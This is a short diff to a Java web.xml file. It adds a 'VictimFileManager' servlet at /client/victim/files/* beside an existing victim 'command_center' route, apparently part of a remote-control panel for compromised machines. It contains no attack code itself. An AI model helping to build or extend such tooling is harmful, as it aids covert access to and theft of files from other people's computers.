@@ -105,5 +105,15 @@
         <url-pattern>/client/victim/command_center/*</url-pattern>
     </servlet-mapping>
 
+    <!-- File manager-->
+    <servlet>
+        <servlet-name>VictimFileManager</servlet-name>
+        <jsp-file>/WEB-INF/client_panel/victim/file_manager.jsp</jsp-file>
+    </servlet>
+
+    <servlet-mapping>
+        <servlet-name>VictimFileManager</servlet-name>
+        <url-pattern>/client/victim/files/*</url-pattern>
+    </servlet-mapping>
 
 </web-app>
